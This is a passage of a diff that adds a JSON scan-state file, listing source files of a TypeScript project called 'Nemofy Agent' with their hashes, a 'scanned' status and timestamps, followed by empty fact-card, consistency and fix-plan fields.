+      "hash": "189c681ad369f8762412e8109c2cb62d0a39982f534efb0e1c6b1c87d87c5650",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.477Z"
+    },
+    "Nemofy Agent/src/lib/contextUtils.ts": {
+      "hash": "28193523ed57a4e91877cc8322e285479cae6d8cc1020202973a7d55be146cad",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.477Z"
+    },
+    "Nemofy Agent/src/lib/filesystemUtils.ts": {
+      "hash": "79b9646f167463d4bcfdf7de198657e57a6ce1c2e4823e0bcdbf28ed1dbec90f",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.478Z"
+    },
+    "Nemofy Agent/src/lib/llmPresets.ts": {
+      "hash": "fee509e1aa8b4483cf5526051eef216c10cedbde7def2e38d6e479308d01edd0",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.478Z"
+    },
+    "Nemofy Agent/src/lib/markdownRenderer.ts": {
+      "hash": "b449874a9fdcc376920070262558bdab2d73353a084fedc0fbfb2be3847279e3",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.478Z"
+    },
+    "Nemofy Agent/src/lib/scrollUtils.ts": {
+      "hash": "f59d80f5810e4e99ea8ca87c235540fbed5b850dad986abf89f11a40de25c0ba",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.479Z"
+    },
+    "Nemofy Agent/src/lib/thinkingModes.ts": {
+      "hash": "d491ae8aaeaaeb15b00da75c30cf148a73856e4938e7831db5de06740f81e51d",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.479Z"
+    },
+    "Nemofy Agent/src/main.tsx": {
+      "hash": "e1c120c32af2d87592716adc070c2e732d1aec2451de2351cb3b72a279308d77",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.479Z"
+    },
+    "Nemofy Agent/src/types/agent.ts": {
+      "hash": "4ddd3ff5c0198524d93b054d0b046ce51799f1f5832e2a24163d3ebcd4aa7154",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.480Z"
+    },
+    "Nemofy Agent/vite.config.ts": {
+      "hash": "653ec8b46928393067f5da360b3c2bbca97ec946a8cab10523f9651e5aeeff3f",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.480Z"
+    },
+    "src/main.tsx": {
+      "hash": "d8773c81167d74e536803a02306198a7b46da2c1b507d0771777c303c36649e6",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.480Z"
+    },
+    "vite.config.ts": {
+      "hash": "3059c97ca1cd3226d4d3154e822734b842f0321ec19938bcbfa06dbc9c2ab272",
+      "status": "scanned",
+      "scannedAt": "2026-11-21T17:36:58.481Z"
+    }
+  },
+  "factCards": {},
+  "consistency": {
+    "checkedAt": null,
+    "conflicts": []
+  },
+  "fixPlan": null
+}
